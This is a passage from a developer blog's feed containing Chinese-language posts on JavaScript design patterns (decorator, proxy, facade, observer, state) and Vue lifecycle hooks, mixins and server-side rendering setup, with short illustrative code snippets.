}}</code></pre><ul><li>vue的computed</li></ul><pre><code class="html">&lt;template&gt;    &lt;div id=&quot;example&quot;&gt;        &lt;p&gt;Original message: &quot;{{ message }}&quot;&lt;/p&gt;  &lt;!-- Hello --&gt;        &lt;p&gt;Computed reversed message: &quot;{{ reversedMessage }}&quot;&lt;/p&gt;  &lt;!-- olleH --&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script type=&#39;text/javascript&#39;&gt;    export default {        name: &#39;demo&#39;,        data() {            return {                message: &#39;Hello&#39;            }        },        computed: {            reversedMessage: function() {                return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;)            }        }    }&lt;/script&gt;</code></pre><p><strong>原有data 中的数据不满足当前的要求，通过计算属性的规则来适配成我们需要的格式，对原有数据并没有改变，只改变了原有数据的表现形式</strong></p><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><p>适配器模式与代理模式很相似</p><ul><li>适配器模式：提供一个不同的接口（如不同版本的插头）</li><li>代理模式：提供一个一模一样的接口</li></ul><h2 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h2><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>动态地给某个对象添加一些额外的职责，，是一种实现继承的替代方案<br>在不改变原对象的基础上，通过对其进行包装扩展，使原有对象可以满足用户的更复杂需求，而不会影响从这个类中派生的其他对象</p><h3 id="code-3"><a href="#code-3" class="headerlink" title="code"></a>code</h3><pre><code class="js">class Cellphone {    create() {        console.log(&#39;生成一个手机&#39;)    }}class Decorator {    constructor(cellphone) {        this.cellphone = cellphone    }    create() {        this.cellphone.create()        this.createShell(cellphone)    }    createShell() {        console.log(&#39;生成手机壳&#39;)    }}// 测试代码let cellphone = new Cellphone()cellphone.create()console.log(&#39;------------&#39;)let dec = new Decorator(cellphone)dec.create()</code></pre><h3 id="场景例子-1"><a href="#场景例子-1" class="headerlink" title="场景例子"></a>场景例子</h3><ul><li>比如现在有4 种型号的自行车，我们为每种自行车都定义了一个单独的类。现在要给每种自行车都装上前灯、尾灯和铃铛这3 种配件。如果使用继承的方式来给每种自行车创建子类，则需要 4×3 = 12 个子类。但是如果把前灯、尾灯、铃铛这些对象动态组合到自行车上面，则只需要额外增加3个类</li><li>ES6 <a href="http://es6.ruanyifeng.com/#docs/decorator" target="_blank" rel="noopener">Decorator</a> 阮一峰</li><li>core-decorators</li></ul><h3 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h3><ul><li>装饰类和被装饰类都只关心自身的核心业务，实现了解耦。</li><li>方便动态的扩展功能，且提供了比继承更多的灵活性。</li></ul><h3 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h3><ul><li>多层装饰比较复杂。</li><li>常常会引入许多小对象，看起来比较相似，实际功能大相径庭，从而使得我们的应用程序架构变得复杂起来</li></ul><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h3 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h3><p>是为一个对象提供一个代用品或占位符，以便控制对它的访问</p><blockquote><p>假设当A 在心情好的时候收到花，小明表白成功的几率有60%，而当A 在心情差的时候收到花，小明表白的成功率无限趋近于0。<br>小明跟A 刚刚认识两天，还无法辨别A 什么时候心情好。如果不合时宜地把花送给A，花被直接扔掉的可能性很大，这束花可是小明吃了7 天泡面换来的。<br>但是A 的朋友B 却很了解A，所以小明只管把花交给B，B 会监听A 的心情变化，然后选择A 心情好的时候把花转交给A，代码如下：</p></blockquote><pre><code class="js">let Flower = function(){}let xiaoming = {  sendFlower: function(target){    let flower = new Flower()    target.receviceFlower()  }}let B = {  receviceFlower:function(flower){    A.listenGoodMood(function(){      A.receviceFlower(flower)    })  }}let A = {  receviceFlower:function(flower){    console.log(&#39;收到花&#39;+ flower)  }  listenGoodMood:function(fn){    setTimeout(function(){      fn()    },1000)  }}xiaoming.sendFlower(B)</code></pre><h3 id="场景例子-2"><a href="#场景例子-2" class="headerlink" title="场景例子"></a>场景例子</h3><ul><li>HTML元 素事件代理</li></ul><pre><code class="html">&lt;ul id=&quot;ul&quot;&gt;  &lt;li&gt;1&lt;/li&gt;  &lt;li&gt;2&lt;/li&gt;  &lt;li&gt;3&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;  let ul = document.querySelector(&#39;#ul&#39;);  ul.addEventListener(&#39;click&#39;, event =&gt; {    console.log(event.target);  });&lt;/script&gt;</code></pre><ul><li>ES6 的 proxy 阮一峰Proxy</li><li>jQuery.proxy()方法</li></ul><h3 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h3><ul><li>代理模式能将代理对象与被调用对象分离，降低了系统的耦合度。代理模式在客户端和目标对象之间起到一个中介作用，这样可以起到保护目标对象的作用</li><li>代理对象可以扩展目标对象的功能；通过修改代理对象就可以了，符合开闭原则；</li></ul><h3 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h3><ul><li>处理请求速度可能有差别，非直接访问存在开销</li></ul><h3 id="不同点-1"><a href="#不同点-1" class="headerlink" title="不同点"></a>不同点</h3><blockquote><p>装饰者模式实现上和代理模式类似<br>装饰者模式： 扩展功能，原有功能不变且可直接使用<br>代理模式： 显示原有功能，但是经过限制之后的</p></blockquote><h2 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h2><h3 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h3><p>为子系统的一组接口提供一个一致的界面，定义了一个高层接口，这个接口使子系统更加容易使用</p><h3 id="code-4"><a href="#code-4" class="headerlink" title="code"></a>code</h3><ol><li>兼容浏览器事件绑定</li></ol><pre><code class="js">let addMyEvent = function (el, ev, fn) {    if (el.addEventListener) {        el.addEventListener(ev, fn, false)    } else if (el.attachEvent) {        el.attachEvent(&#39;on&#39; + ev, fn)    } else {        el[&#39;on&#39; + ev] = fn    }}; </code></pre><ol start="2"><li>封装接口</li></ol><pre><code class="js">let myEvent = {    // ...    stop: e =&gt; {        e.stopPropagation();        e.preventDefault();    }};</code></pre><p>斜挎单肩包，透气跑鞋，运动袜，T恤，运动短裤</p><h3 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h3><ul><li>设计初期，应该要有意识地将不同的两个层分离，比如经典的三层结构，在数据访问层和业务逻辑层、业务逻辑层和表示层之间建立外观Facade</li><li>在开发阶段，子系统往往因为不断的重构演化而变得越来越复杂，增加外观Facade可以提供一个简单的接口，减少他们之间的依赖。</li><li>在维护一个遗留的大型系统时，可能这个系统已经很难维护了，这时候使用外观Facade也是非常合适的，为系统开发一个外观Facade类，为设计粗糙和高度复杂的遗留代码提供比较清晰的接口，让新系统和Facade对象交互，Facade与遗留代码交互所有的复杂工作。</li></ul><h3 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h3><ul><li>减少系统的相互依赖</li><li>提高了灵活性</li><li>提高了安全性</li></ul><h3 id="缺点-5"><a href="#缺点-5" class="headerlink" title="缺点"></a>缺点</h3><p>不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。</p><h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><h3 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h3><p>一种一对多的关系，让多个观察者对象同时监听某一个主题对象，这个主题对象的状态发生变化时就会通知所有的观察者对象，使它们能够自动更新自己，当一个对象的改变需要同时改变其它对象，并且它不知道具体有多少对象需要改变的时候，就应该考虑使用观察者模式。</p><ul><li>发布 &amp; 订阅</li><li>一对多</li></ul><h3 id="code-5"><a href="#code-5" class="headerlink" title="code"></a>code</h3><pre><code class="js">// 主题 保存状态，状态变化之后触发所有观察者对象class Subject {  constructor() {    this.state = 0    this.observers = []  }  getState() {    return this.state  }  setState(state) {    this.state = state    this.notifyAllObservers()  }  notifyAllObservers() {    this.observers.forEach(observer =&gt; {      observer.update()    })  }  attach(observer) {    this.observers.push(observer)  }}// 观察者class Observer {  constructor(name, subject) {    this.name = name    this.subject = subject    this.subject.attach(this)  }  update() {    console.log(`${this.name} update, state: ${this.subject.getState()}`)  }}// 测试let s = new Subject()let o1 = new Observer(&#39;o1&#39;, s)let o2 = new Observer(&#39;02&#39;, s)s.setState(12)</code></pre><h3 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h3><ul><li>DOM事件</li></ul><pre><code class="js">document.body.addEventListener(&#39;click&#39;, function() {    console.log(&#39;hello world!&#39;);});document.body.click()</code></pre><ul><li>Vue响应式</li></ul><h3 id="优点-6"><a href="#优点-6" class="headerlink" title="优点"></a>优点</h3><ul><li>支持简单的广播通信，自动通知所有已经订阅过的对象</li><li>目标对象与观察者之间的抽象耦合关系能单独扩展以及重用</li><li>增加了灵活性</li><li>观察者模式所做的工作就是在解耦，让耦合的双方都依赖于抽象，而不是依赖于具体。从而使得各自的变化都不会影响到另一边的变化。</li></ul><h3 id="缺点-6"><a href="#缺点-6" class="headerlink" title="缺点"></a>缺点</h3><p>过度使用会导致对象与对象之间的联系弱化，会导致程序难以跟踪维护和理解</p><h2 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h2><h3 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h3><p>允许一个对象在其内部状态改变的时候改变它的行为，对象看起来似乎修改了它的类</p><h3 id="code-6"><a href="#code-6" class="headerlink" title="code"></a>code</h3><pre><code class="js">class State {  constructor(state){    this.state = state  }  handle(context){    console.log(`this is ${context} light`)  }}class Context{  constructor(){    this.state = null  }  getState(){    return this.state  }  setState(state){    this.state = state  }}let context = new Context()let weak = new State(&#39;Weak&#39;)let strong = new State(&#39;Strong&#39;)let off = new State(&#39;off&#39;)// 弱光weak.handle(context)console.log(context.getState())// 强光strong.handle(context)console.log(context.getState())// 关闭off.handle(context)console.log(context.getState())</code></pre><h3 id="场景-3"><a href="#场景-3" class="headerlink" title="场景"></a>场景</h3><ul><li>一个对象的行为取决于它的状态，并且它必须在运行时刻根据状态改变它的行为</li><li>一个操作中含有大量的分支语句，而且这些分支语句依赖于该对象的状态</li></ul><h3 id="优点-7"><a href="#优点-7" class="headerlink" title="优点"></a>优点</h3><ul><li>定义了状态与行为之间的关系，封装在一个类里，更直观清晰，增改方便</li><li>状态与状态间，行为与行为间彼此独立互不干扰</li><li>用对象代替字符串来记录当前状态，使得状态的切换更加一目了然</li></ul><h3 id="缺点-7"><a href="#缺点-7" class="headerlink" title="缺点"></a>缺点</h3><ul><li>会在系统中定义许多状态类</li><li>逻辑分散</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5e021eb96fb9a01628014095&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;设计模式简介&quot;&gt;&lt;a href=&quot;#设计模式简介&quot; c
      
    
    </summary>
    
      <category term="Js" scheme="https://zhanghao-web.github.io/categories/Js/"/>
    
    
      <category term="ES6" scheme="https://zhanghao-web.github.io/tags/ES6/"/>
    
      <category term="设计模式" scheme="https://zhanghao-web.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Vue开发实践(下)</title>
    <link href="https://zhanghao-web.github.io/2020/05/10/Vue/%E5%90%83%E9%80%8FVue%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5-%E4%B8%8B/"/>
    <id>https://zhanghao-web.github.io/2020/05/10/Vue/吃透Vue项目开发实践-下/</id>
    <published>2020-05-10T09:30:23.000Z</published>
    <updated>2020-05-11T06:16:01.028Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5e1eb1dff265da3e354ea2d0" target="_blank" rel="noopener">原文地址</a>   </p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面两篇文章总结了 Vue 开发的大部分技巧和内容，最后一篇文章来对它进行一个收尾<br>这篇文章我们来谈谈一些 Vue 理解和实践要求高一点的问题</p><p>首先是生命周期这一块内容，随着实践越多它的意义越大，理解也越深刻</p><p>mixin 功能强大，对代码复用组织都有很高的要求，算是 Vue 后期发力的高级技巧</p><p>服务端渲染可能是学习 Vue 最后一块阵地了，对于 SPA 框架的一个里程碑</p><p>最后，总结一下我在使用 Vue 中使用的技巧和经验</p><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c9c19f1dd22b7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="概览"></p><h1 id="Vue-生命周期"><a href="#Vue-生命周期" class="headerlink" title="Vue 生命周期"></a>Vue 生命周期</h1><h2 id="什么是-Vue-生命周期？"><a href="#什么是-Vue-生命周期？" class="headerlink" title="什么是 Vue 生命周期？"></a>什么是 Vue 生命周期？</h2><p>Vue 生命周期大概就是：一个从 Vue 实例的创建到组件销毁的一个的过程。</p><p>具体情况下，我们分为几个核心的阶段，并且每个阶段都有一套钩子函数来执行我们需要的代码。</p><h3 id="生命周期阶段与钩子"><a href="#生命周期阶段与钩子" class="headerlink" title="生命周期阶段与钩子"></a>生命周期阶段与钩子</h3><p>我们整理分类一下这些生命周期钩子，为了记忆方便分为 4 大核心阶段：</p><p>方便读者记忆，这里尽量使用图示：<br><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c9c27264b6562?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="图示"></p><p>可以看到每一个阶段中的钩子命名都很好记忆，阶段开始前使用 <code>beforeXxx</code>，阶段后结束后使用<code>xxxed</code></p><p>除这 8 个核心钩子，另外还有 3 个新增功能型钩子，目前总共是 11 个钩子 顺带提一下这 3 个钩子的功能</p><ol><li>组件缓存，<code>activated</code> 与 <code>deactivated</code>，这两个钩子也是一对的，分别表示被 keep-alive 缓存的组件激活和停用时调用。</li><li>组件错误捕获，<code>errorCaptured</code>，对组件中出现对异常错误进行处理，使用较少。</li></ol><h3 id="Vue-源码基本流程"><a href="#Vue-源码基本流程" class="headerlink" title="Vue 源码基本流程"></a>Vue 源码基本流程</h3><p>对于上面那张图的理解，我们需要对 Vue 源码进行梳理，才能真正的理解。大概根据现有的源码，我梳理了一下大致的流程：</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c9c2cc22b99c2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="源码"></p><p>我们可以清楚的看到，从 Vue 实例创建、组件挂载、渲染的一些过程中，有着明显的周期节点。</p><h3 id="简化文字图解"><a href="#简化文字图解" class="headerlink" title="简化文字图解"></a>简化文字图解</h3><p>对于上面那张图的理解，我们需要对 Vue 源码进行梳理，才能真正的理解。大概根据现有的源码，我梳理了一下大致的流程：</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/11/170c9c2cc22b99c2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="图解"></p><h2 id="实践验证一下生命周期"><a href="#实践验证一下生命周期" class="headerlink" title="实践验证一下生命周期"></a>实践验证一下生命周期</h2><h3 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h3><p>下面我们提出一些问题：</p><ol><li>什么时期创建 el ？</li><li>什么时期挂载 data ？</li><li>什么时期可以访问 dom ？</li><li>什么情况下组件会更新？更新是同步更新还是异步更新？</li><li>什么情况下组件会被销毁？</li><li>销毁组件后，还可以访问哪些内容？</li></ol><h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><ol><li>首先写一个小 demo，打印关键组件信息</li></ol><pre><code class="html">&lt;template&gt;  &lt;div&gt;    &lt;div class=&quot;message&quot;&gt;      {{message}}    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {      data() {            return {                  message: &#39;1&#39;            }    },      methods: {            printComponentInfo(lifeName) {                  console.log(lifeName)                  console.log(&#39;el&#39;, this.$el)                  console.log(&#39;data&#39;, this.$data)                  console.log(&#39;watch&#39;, this.$watch)            }      }}&lt;/script&gt;</code></pre><ol start="2"><li>增加核心的 8 个生命周期钩子，分别调用打印方法</li></ol><pre><code class="js">  // ...    beforeCreate() {    this.printComponentInfo(&#39;beforeCreate&#39;)  },    created() {    this.printComponentInfo(&#39;created&#39;)  },    beforeMount() {    this.printComponentInfo(&#39;beforeMount&#39;)  },    mounted() {    this.printComponentInfo(&#39;mounted&#39;)  },    beforeUpdate() {    this.printComponentInfo(&#39;beforeUpdate&#39;)  },    updated() {    this.printComponentInfo(&#39;updated&#39;)  },    beforeDestroy() {    this.printComponentInfo(&#39;beforeDestroy&#39;)  },    destroyed() {    this.printComponentInfo(&#39;destroyed&#39;)  },    // ...</code></pre><h3 id="创建阶段"><a href="#创建阶段" class="headerlink" title="创建阶段"></a>创建阶段</h3><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c25e769e9f94e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="创建"></p><p>beforeCreate 中methods中方法直接报错无法访问，直接访问 el 和 data 后</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c26347c3622f5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="创建"></p><p>发现只能访问到 watch， el 和 data 均不能访问到</p><p>created 时期 el 无法访问到，但是可以访问到 data 了</p><h3 id="挂载阶段"><a href="#挂载阶段" class="headerlink" title="挂载阶段"></a>挂载阶段</h3><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c2679f7e956d2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="挂载"></p><p><code>beforeMount</code> 中可以访问 data 但是仍然访问不到 el</p><p><code>mounted</code> 中可以访问到 el 了</p><blockquote><p>首次加载页面，更新阶段和销毁阶段到钩子都未触发</p></blockquote><h3 id="更新阶段"><a href="#更新阶段" class="headerlink" title="更新阶段"></a>更新阶段</h3><pre><code class="js">this.message = this.message + 1</code></pre><p>如果增加在 created 阶段，发现 update钩子仍然未触发，但是 el 和 data 的值都变成了 2</p><p>如果增加在 mounted 阶段，发现 update钩子此时触发了</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c2727250a6c8c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="更新"></p><h3 id="销毁阶段"><a href="#销毁阶段" class="headerlink" title="销毁阶段"></a>销毁阶段</h3><p>怎样触发销毁的钩子呢？ 大概有这几种方法</p><ul><li>手动调用 $destory</li><li>v-if 与 v-for 指令，（v-show 不行）</li><li>路由切换和关闭或刷新浏览器</li></ul><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c2ef6a6785ddc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="路由切换"></p><h2 id="生命周期钩子常见使用的场景"><a href="#生命周期钩子常见使用的场景" class="headerlink" title="生命周期钩子常见使用的场景"></a>生命周期钩子常见使用的场景</h2><h3 id="beforeCreate-谨慎操作-this"><a href="#beforeCreate-谨慎操作-this" class="headerlink" title="beforeCreate 谨慎操作 this"></a>beforeCreate 谨慎操作 this</h3><p><code>beforeCreate</code> 无法访问到 this 中的 <code>data、method</code></p><h3 id="请求应放在-created-钩子中"><a href="#请求应放在-created-钩子中" class="headerlink" title="请求应放在 created 钩子中"></a>请求应放在 created 钩子中</h3><p>created 可以访问 this，但无法访问 dom，dom 未挂载</p><h3 id="操作-DOM-代码应放在-mounted-钩子中"><a href="#操作-DOM-代码应放在-mounted-钩子中" class="headerlink" title="操作 DOM 代码应放在 mounted 钩子中"></a>操作 DOM 代码应放在 mounted 钩子中</h3><p>mounted 已经挂载 dom，可以访问 this</p><blockquote><p>生命周期相关demo 代码见<a href="生命周期相关demo 代码见github-lifecycle-demo">github-lifecycle-demo</a></p></blockquote><h1 id="理解并合理使用-mixin"><a href="#理解并合理使用-mixin" class="headerlink" title="理解并合理使用 mixin"></a>理解并合理使用 mixin</h1><h2 id="什么是-mixin（混入）"><a href="#什么是-mixin（混入）" class="headerlink" title="什么是 mixin（混入）"></a>什么是 mixin（混入）</h2><blockquote><p>当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项 大致原理就是将外来的组件、方法以某种方式进行合并。合并的规则有点像继承和扩展。</p></blockquote><p>当组件和混入对象含有<strong>同名选项</strong>时，这些选项将以恰当的方式进行“合并”</p><p>我们看一下一个组件里面有哪些东西是可以合并的</p><p><code>data、methods、computed、directives、components</code> 生命周期钩子</p><p>没错这些都可以混入</p><pre><code class="js">import demoMixin form &#39;@/mixins/demo&#39;export default {        mixins: [demoMixin]}</code></pre><p>这样看来，很多页面重复的代码我们都可以直接抽取出来<br>或者是封装成一个公共的 <code>mixin</code><br>比如我们做 H5 页面，里面很多短信验证的逻辑固有逻辑，但是需要访问到 this。使用工具函数肯定不行。<br>这时候就可以考虑使用 <code>mixin</code>，封装成一个具有响应式的模块。供需要的地方进行引入。</p><h2 id="mixin-规则"><a href="#mixin-规则" class="headerlink" title="mixin 规则"></a>mixin 规则</h2><p>首先是<strong>优先级</strong>的问题，当重名选项时选择哪一个为最后的结果</p><p>默认规则我这里分为 3 类</p><ul><li><ol><li>data 混入: 以当前组件值为最后的值</li></ol></li><li><ol start="2"><li>生命周期钩子: 保留所有钩子，先执行 mixins 的，后执行当前组件的</li></ol></li><li><ol start="3"><li>methods、computed、directives、components 这种健值对形式，同名key，统统以当前组件为准</li></ol></li></ul><p>当然如果想改变规则，也可以通过配置来改变规则</p><pre><code class="js">Vue.config.optionMergeStrategies.myOption = function (toVal, fromVal) {    // 返回合并后的值}</code></pre><h2 id="mixin-的好处"><a href="#mixin-的好处" class="headerlink" title="mixin 的好处"></a>mixin 的好处</h2><p>我们知道 <code>Vue</code> 最能复用代码的就是组件。一般情况，我们通过 <code>props</code> 来控制组件的，将原有组件封装成 <code>HOC</code> 高阶组件。而控制 <code>props</code> 的生成不一样的功能的代码还是写在基础组件里。</p><pre><code class="html">&lt;template lang=&quot;pug&quot;&gt;  div.dib    van-button.btn(          @click=&quot;$emit(&#39;click&#39;)&quot;          :class=&quot;getClass&quot; v-bind=&quot;$attrs&quot;          :style=&quot;{&#39;width&#39;: size === &#39;large&#39; ? &#39;345px&#39;: &#39;&#39;,     &#39;backgroundColor&#39;: getBgColor,     borderColor: getBgColor, color: getBgColor}&quot;)      slot&lt;/template&gt;&lt;script&gt;import { Button } from &#39;vant&#39;import Vue from &#39;vue&#39;import { getColor } from &#39;@/utils&#39;Vue.use(Button)export default {      name: &#39;app-button&#39;,      props: {            type: {                  type: String,                  default: &#39;primary&#39;            },            theme: {                  type: String,                  default: &#39;blue&#39;            },            size: {                  type: String,                  default: &#39;&#39;           }      }}</code></pre><p>以这个组件为例，我们还是<strong>通过公共组件内部的逻辑，来改变组件的行为</strong>。</p><p>但是，使用 mixin 提供了另一个思路。我们写好公共的 mixin，每一个需要使用 mixin 的地方。我们进行扩展合并，不同与公共 mixin 的选项我们在当前组件中进行自定义，也就是扩展。<strong>我们新的逻辑是写在当前组件里面的，而非公共 mixins 里</strong>。</p><p>画个图理解一下：</p><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c3937144fd11f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="画个图"></p><h2 id="最后总结一下-mixin-的优点及缺点"><a href="#最后总结一下-mixin-的优点及缺点" class="headerlink" title="最后总结一下 mixin 的优点及缺点"></a>最后总结一下 mixin 的优点及缺点</h2><p><strong>优点</strong></p><ul><li>复用代码，公共逻辑抽离</li><li>可以访问 this, 可以操作响应式代码</li><li>mixins 相对与组件来说，更像扩展</li></ul><p><strong>缺点</strong></p><ul><li>千万不能滥用全局 mixins 因为会影响所有多子组件</li><li>由于 mixins 的合并策略固有影响，可能在一些极端情况达不到你想要的效果。</li></ul><p>比如：我已经存在一个 <code>mixins</code>，我的页面里面也有一些方法，我要引入<code>mixins</code> 就要做很多改动，来保证我的代码按我的需要运行。</p><p>页面 data 有一个 <code>message</code> 值，<code>mixins</code> 里面同样有一个。</p><p>按照默认规则，<code>mixins</code> 里面的 <code>message</code> 会被页面里面 <code>message</code> 覆盖。但是这两个 <code>message</code> 可能代表的意义不一样，都需要存在。那么我就需要改掉其中的一个，如果业务太深的话，可能这个 <code>message</code> 没那么好改。</p><p>有时候需要考虑这些问题，导致使用 <code>mixins</code> 都会增加一些开发负担。当然也是这些问题可以使用规范来规避。</p><h1 id="理解并使用-SSR"><a href="#理解并使用-SSR" class="headerlink" title="理解并使用 SSR"></a>理解并使用 SSR</h1><blockquote><p>SSR 是 Serve Side Render 的缩写，翻译过来就是我们常说的服务端渲染</p></blockquote><h2 id="简单归纳-SSR-存在的原因"><a href="#简单归纳-SSR-存在的原因" class="headerlink" title="简单归纳 SSR 存在的原因"></a>简单归纳 SSR 存在的原因</h2><ol><li>SPA 框架 SEO 的解决方案</li><li>提升首屏加载速度</li></ol><p>但是它还存在以下问题</p><ul><li>有些生命周期钩子无法使用（之前提到的 activated 和 deactivated 等等）</li><li>额外很多的配置</li><li>服务器资源的需求</li></ul><p>总得来说，SSR 是必要的但不是充分的，SPA 的 SEO 现在没有更好的方案，有这方面强烈需求的网站来说，SSR 确实很有必要</p><h2 id="SSR-原理"><a href="#SSR-原理" class="headerlink" title="SSR 原理"></a>SSR 原理</h2><p><img src="https://user-gold-cdn.xitu.io/2020/3/10/170c3ed6607a605c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="SSR 原理"></p><p>通过上面图我们可以得大致几点内容</p><ul><li>通用业务代码只写一套。</li><li>通过暴露客户端和服务端两个入口，对 Vue 实例进行访问。</li><li>通过构建工具打成两个包，服务端包通过 node 服务器渲染给浏览器访问。客户端和原来一样通过访问资源获取。</li></ul><h2 id="实现SSR-有-3-种方式"><a href="#实现SSR-有-3-种方式" class="headerlink" title="实现SSR 有 3 种方式"></a>实现SSR 有 3 种方式</h2><ol><li>根据官网教程搭建，一步一步搭建SSR， 这里有具体教程，略微有点麻烦，但是能够体验搭建的过程，更加深入细节。使用于练习，和现有项目的改造</li><li>使用demo改造，开源 demo，方便省时，适用代码参考学习 <a href="https://github.com/vuejs/vue-hackernews-2.0" target="_blank" rel="noopener">vue-ssr-demo</a></li><li>使用nuxt，预设了 SSR 和预渲染，适用于需要 SSR 的新项目。</li></ol><p><strong>分别尝试用这 3 种方式搭建 SSR</strong></p><h2 id="五步简单理解SSR（根据官网教程，具体完操作查看整教程和demo）"><a href="#五步简单理解SSR（根据官网教程，具体完操作查看整教程和demo）" class="headerlink" title="五步简单理解SSR（根据官网教程，具体完操作查看整教程和demo）"></a>五步简单理解SSR（根据官网教程，具体完操作查看整教程和demo）</h2><p><em>这里主要加深理解，vue-cli3+ 实现基本 SSR</em></p><h3 id="第一步：安装依赖"><a href="#第一步：安装依赖" class="headerlink" title="第一步：安装依赖"></a>第一步：安装依赖</h3><ul><li>vue-server-renderer （核心依赖，版本必须与 vue 版本一致）</li><li>webpack-merge（用于webpack配置合并）</li><li>webpack-node-externals （用于webpack配置更改）</li><li>express (用于服务端渲染)</li></ul><h3 id="第二步：建立入口，并改造改造"><a href="#第二步：建立入口，并改造改造" class="headerlink" title="第二步：建立入口，并改造改造"></a>第二步：建立入口，并改造改造</h3><p>分为 2 个入口，将 <code>main.js</code> 定为通用入口， 并额外增加<code>entry-client.js</code> 和 <code>entry-serve.js</code> 两个</p><p>1.改造主要入口，创建工厂函数</p><pre><code class="js">// main.jsimport Vue from &#39;vue&#39;import App from &#39;./App.vue&#39;import { createRouter } from &quot;./router&quot;// app、routerexport function createApp () {      const router = createRouter()      const app = new Vue({            router,            render: h =&gt; h(App)      })      return {         app, router     }}</code></pre><p>2.客户端入口</p><pre><code class="js">// client.jsimport { createApp } from &#39;./main&#39;// 客户端特定引导逻辑const { app } = createApp()app.$mount(&#39;#app&#39;)</code></pre><p>3.服务端入口</p><pre><code class="js">// serve.jsimport { createApp } from &quot;./main&quot;;export default context =&gt; {      // 因为有可能会是异步路由钩子函数或组件，所以我们将返回一个 Promise      return new Promise((resolve, reject) =&gt; {            const { app, router } = createApp();            // 设置服务器端 router 的位置            router.push(context.url);            // 等到 router 将可能的异步组件和钩子函数解析完            router.onReady(() =&gt; {                  const matchedComponents = router.getMatchedComponents();                  // 匹配不到的路由，执行 reject 函数                  if (!matchedComponents.length) {                        return reject({                              code: 404                        });                  }                  // Promise 应该 resolve 应用程序实例，以便它可以渲染                  resolve(app);           }, reject);      });};</code></pre><h3 id="第三步：改造-vue-config-配置"><a href="#第三步：改造-vue-config-配置" class="headerlink" title="第三步：改造 vue.config 配置"></a>第三步：改造 vue.config 配置</h3><pre><code class="js">const VueSSRServerPlugin = require(&quot;vue-server-renderer/server-plugin&quot;);const VueSSRClientPlugin = require(&quot;vue-server-renderer/client-plugin&quot;);const nodeExternals = require(&quot;webpack-node-externals&quot;);const merge = require(&quot;webpack-merge&quot;);const TARGET_NODE = process.env.WEBPACK_TARGET === &quot;node&quot;;const target = TARGET_NODE ? &quot;server&quot; : &quot;client&quot;;module.exports = {      configureWebpack: () =&gt; ({            entry: `./src/entry-${target}.js`,            devtool: &#39;source-map&#39;,            target: TARGET_NODE ? &quot;node&quot; : &quot;web&quot;,            node: TARGET_NODE ? undefined : false,            output: {                  libraryTarget: TARGET_NODE ? &quot;commonjs2&quot; : undefined            },            externals: TARGET_NODE              ? nodeExternals({                      whitelist: [/\.css$/]                }): undefined,            optimization: {                      splitChunks: undefined            },            plugins: [            TARGET_NODE ? new VueSSRServerPlugin() : new VueSSRClientPlugin()]          }),         //...};</code></pre><h3 id="第四步：对路由-router-改造"><a href="#第四步：对路由-router-改造" class="headerlink" 